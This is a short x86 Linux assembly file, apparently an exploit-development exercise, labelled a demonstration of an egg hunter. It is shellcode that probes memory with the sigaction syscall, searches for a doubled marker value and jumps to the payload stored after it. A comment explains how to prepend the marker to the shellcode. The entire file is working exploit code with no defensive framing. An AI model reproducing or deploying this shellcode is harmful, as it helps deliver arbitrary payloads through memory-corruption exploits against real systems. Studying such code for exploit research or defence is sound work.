; shellcode.asm 
; Author: Mutti K
; Purpose: Demonstration of simple egg hunter.

global _start

section .text

_start:
    or cx,0xfff
next:
    inc ecx
    ;sigaction syscall
    push byte +0x43
    pop eax
    int 0x80
    cmp al,0xf2 ; Check for EFAULT
    jz _start ; EFAULT raised, realign
    mov eax,0x90509050 ; egg search value w00t. Shellcode needs to have this egg prepended twice.
;    mov eax,0x744f4f77 ; egg search value w00t. Shellcode needs to have this egg prepended twice.
    mov edi,ecx
    scasd
    jnz next
    scasd
    jnz next
    jmp edi
